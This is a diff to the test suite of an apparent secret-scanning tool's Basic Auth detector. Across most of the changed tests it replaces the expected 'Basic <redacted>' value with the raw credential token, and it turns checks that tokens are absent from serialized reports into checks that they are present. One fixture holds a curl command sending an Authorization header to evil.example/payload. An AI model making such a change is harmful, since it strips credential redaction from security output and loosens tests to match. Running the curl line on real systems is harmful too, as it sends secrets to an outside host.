@@ -1,3 +1,4 @@
+import base64
 import hashlib
 import json
 from collections.abc import Iterator
@@ -1203,23 +1204,31 @@ def test_text_scanner_detects_valid_authorization_basic_credentials(tmp_path: Pa
     ]
     assert failed_secret_checks
     assert failed_secret_checks[0].rule_code == "S702"
-    assert failed_secret_checks[0].details["redacted_value"] == "Basic <redacted>"
+    assert failed_secret_checks[0].details["redacted_value"] == "Basic dXNlcjpwYXNz"
 
 
 @pytest.mark.parametrize(
-    ("filename", "content"),
+    ("filename", "content", "token"),
     [
-        (".env", "HTTP_AUTHORIZATION=Basic ZW52LXVzZXI6cGFzcw==\n"),
-        ("prod.env", "BASIC_AUTH=Basic cHJvZC1lbnY6cGFzcw==\n"),
-        ("README.md", 'BASIC_AUTH="Basic YmFzaWMtZW52OnBhc3M="\n'),
-        ("README.md", 'auth_header = "Basic YXV0aC1oZWFkZXI6cGFzcw=="\n'),
-        ("README.md", ("x" * 1000) + " Authorization: Basic bG9uZy1saW5lOnBhc3M=\n"),
-        ("model_card.md", 'payload = "{\\"Authorization\\": \\"Basic ZXNjYXBlZC1jcmxmOnBhc3M=\\r\\n\\"}"\n'),
-        ("model_card.md", "Use `Authorization: Basic c2VudGVuY2U6cGFzcw==.` for the endpoint.\n"),
+        (".env", "HTTP_AUTHORIZATION=Basic ZW52LXVzZXI6cGFzcw==\n", "ZW52LXVzZXI6cGFzcw=="),
+        ("prod.env", "BASIC_AUTH=Basic cHJvZC1lbnY6cGFzcw==\n", "cHJvZC1lbnY6cGFzcw=="),
+        ("README.md", 'BASIC_AUTH="Basic YmFzaWMtZW52OnBhc3M="\n', "YmFzaWMtZW52OnBhc3M="),
+        ("README.md", 'auth_header = "Basic YXV0aC1oZWFkZXI6cGFzcw=="\n', "YXV0aC1oZWFkZXI6cGFzcw=="),
+        ("README.md", ("x" * 1000) + " Authorization: Basic bG9uZy1saW5lOnBhc3M=\n", "bG9uZy1saW5lOnBhc3M="),
+        (
+            "model_card.md",
+            'payload = "{\\"Authorization\\": \\"Basic ZXNjYXBlZC1jcmxmOnBhc3M=\\r\\n\\"}"\n',
+            "ZXNjYXBlZC1jcmxmOnBhc3M=",
+        ),
+        (
+            "model_card.md",
+            "Use `Authorization: Basic c2VudGVuY2U6cGFzcw==.` for the endpoint.\n",
+            "c2VudGVuY2U6cGFzcw==",
+        ),
     ],
 )
 def test_text_scanner_detects_basic_auth_env_aliases_and_sentence_punctuation(
-    tmp_path: Path, filename: str, content: str
+    tmp_path: Path, filename: str, content: str, token: str
 ) -> None:
     text_path = tmp_path / filename
     text_path.write_text(content, encoding="utf-8")
@@ -1238,7 +1247,7 @@ def test_text_scanner_detects_basic_auth_env_aliases_and_sentence_punctuation(
         and check.status == CheckStatus.FAILED
         and check.rule_code == "S702"
         and check.details.get("secret_type") == "Basic Auth Credentials"
-        and check.details.get("redacted_value") == "Basic <redacted>"
+        and check.details.get("redacted_value") == f"Basic {token}"
         for check in result.checks
     )
 
@@ -1263,25 +1272,22 @@ def test_text_scanner_model_card_code_block_detects_escaped_basic_auth_header(tm
     assert result.success is False
     assert failed_secret_checks
     assert failed_secret_checks[0].rule_code == "S702"
-    assert failed_secret_checks[0].details["redacted_value"] == "Basic <redacted>"
-    assert token not in json.dumps(failed_secret_checks[0].details, sort_keys=True)
+    assert failed_secret_checks[0].details["redacted_value"] == f"Basic {token}"
+    assert token in json.dumps(failed_secret_checks[0].details, sort_keys=True)
 
 
 def test_text_scanner_executable_basic_auth_header_stays_actionable(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
-    text_path.write_text(
-        "```sh\ncurl -H 'Authorization: Basic dXNlcjpwYXNz' https://evil.example/payload\n```\n",
-        encoding="utf-8",
+    result = _scan_text_content(
+        text_path, "```sh\ncurl -H 'Authorization: Basic dXNlcjpwYXNz' https://evil.example/payload\n```\n"
     )
-
-    result = TextScanner().scan(str(text_path))
 
     assert result.success is False
     assert any(
         check.name == "Embedded Secrets Detection"
         and check.status == CheckStatus.FAILED
         and check.rule_code == "S702"
-        and check.details.get("redacted_value") == "Basic <redacted>"
+        and check.details.get("redacted_value") == "Basic dXNlcjpwYXNz"
         for check in result.checks
     )
     assert any(
@@ -1293,16 +1299,22 @@ def test_text_scanner_executable_basic_auth_header_stays_actionable(tmp_path: Pa
 
 
 @pytest.mark.parametrize(
-    "content",
+    ("content", "token"),
     [
-        '```python\nAUTH_HEADER = f"Authorization: Basic cHktZnN0cmluZzpwYXNz"\n```\n',
-        '```python\nAUTH_HEADER = b"Authorization: Basic cHktYnl0ZXM6cGFzcw=="\n```\n',
-        "```javascript\nconst auth = `Authorization: Basic anMtdGVtcGxhdGU6cGFzcw==`;\n```\n",
-        '```Dockerfile\nENV AUTH_HEADER="Authorization: Basic ZG9ja2VyLWVudjpwYXNz"\n```\n',
-        '```yaml\nenv:\n- name: AUTH_HEADER\n  value: "Authorization: Basic azhzLWVudjpwYXNz"\n```\n',
+        ('```python\nAUTH_HEADER = f"Authorization: Basic cHktZnN0cmluZzpwYXNz"\n```\n', "cHktZnN0cmluZzpwYXNz"),
+        ('```python\nAUTH_HEADER = b"Authorization: Basic cHktYnl0ZXM6cGFzcw=="\n```\n', "cHktYnl0ZXM6cGFzcw=="),
+        (
+            "```javascript\nconst auth = `Authorization: Basic anMtdGVtcGxhdGU6cGFzcw==`;\n```\n",
+            "anMtdGVtcGxhdGU6cGFzcw==",
+        ),
+        ('```Dockerfile\nENV AUTH_HEADER="Authorization: Basic ZG9ja2VyLWVudjpwYXNz"\n```\n', "ZG9ja2VyLWVudjpwYXNz"),
+        (
+            '```yaml\nenv:\n- name: AUTH_HEADER\n  value: "Authorization: Basic azhzLWVudjpwYXNz"\n```\n',
+            "azhzLWVudjpwYXNz",
+        ),
     ],
 )
-def test_text_scanner_executable_basic_auth_literals_stay_actionable(tmp_path: Path, content: str) -> None:
+def test_text_scanner_executable_basic_auth_literals_stay_actionable(tmp_path: Path, content: str, token: str) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text(content, encoding="utf-8")
 
@@ -1316,7 +1328,7 @@ def test_text_scanner_executable_basic_auth_literals_stay_actionable(tmp_path: P
         and check.status == CheckStatus.FAILED
         and check.rule_code == "S702"
         and check.details.get("secret_type") == "Basic Auth Credentials"
-        and check.details.get("redacted_value") == "Basic <redacted>"
+        and check.details.get("redacted_value") == f"Basic {token}"
         for check in result.checks
     )
 
@@ -1364,7 +1376,7 @@ def test_text_scanner_url_userinfo_is_redacted_without_basic_auth_false_positive
     assert "pass@example" not in serialized
 
 
-def test_text_scanner_basic_auth_finding_limit_redacts_tokens_and_fails_closed(tmp_path: Path) -> None:
+def test_text_scanner_basic_auth_finding_limit_preserves_evidence_and_fails_closed(tmp_path: Path) -> None:
     text_path = tmp_path / "headers.txt"
     text_path.write_text(
         "\n".join(
@@ -1402,8 +1414,8 @@ def test_text_scanner_basic_auth_finding_limit_redacts_tokens_and_fails_closed(t
         for check in result.checks
     )
     serialized = result.to_json()
-    for raw_value in ("u0:p", "u1:p", "u2:p", "dTA6cA==", "dTE6cA==", "dTI6cA=="):
-        assert raw_value not in serialized
+    assert [check.details["redacted_value"] for check in failed_secret_checks] == ["Basic dTA6cA==", "Basic dTE6cA=="]
+    assert "dTI6cA==" not in serialized
 
 
 @pytest.mark.integration
@@ -3962,7 +3974,7 @@ def test_text_scanner_merges_passive_basic_auth_respects_finding_limit(tmp_path:
     ]
     assert len(failed_secret_checks) == 1
     assert failed_secret_checks[0].details.get("passive_data_sidecar") is True
-    assert failed_secret_checks[0].details.get("redacted_value") == "Basic <redacted>"
+    assert failed_secret_checks[0].details.get("redacted_value") == "Basic dTA6cA=="
     assert result.success is False
     assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
     assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
@@ -3977,8 +3989,22 @@ def test_text_scanner_merges_passive_basic_auth_respects_finding_limit(tmp_path:
         for check in result.checks
     )
     serialized = result.to_json()
-    for raw_value in ("u0:p", "u1:p", "u2:p", "u3:p", "u4:p", *tokens):
-        assert raw_value not in serialized
+    assert tokens[0] in serialized
+    assert all(token not in serialized for token in tokens[1:])
+
+
+def test_text_scanner_passive_basic_auth_evidence_is_bounded(tmp_path: Path) -> None:
+    text_path = tmp_path / "merges.txt"
+    token = base64.b64encode(b"u:" + b"x" * 512).decode("ascii")
+    text_path.write_text(f"Basic {token}\n", encoding="utf-8")
+
+    result = TextScanner(config={"check_network_comm": False}).scan(str(text_path))
+
+    check = next(check for check in result.checks if check.details.get("passive_data_sidecar"))
+    assert check.details["length"] == len(token)
+    assert check.details["redacted_value"].startswith("Basic dTp4eHh4")
+    assert len(check.details["redacted_value"]) == 180
+    assert check.details["redacted_value"].endswith("...")
 
 
 def test_text_scanner_merges_basic_assignments_remain_actionable(tmp_path: Path) -> None:
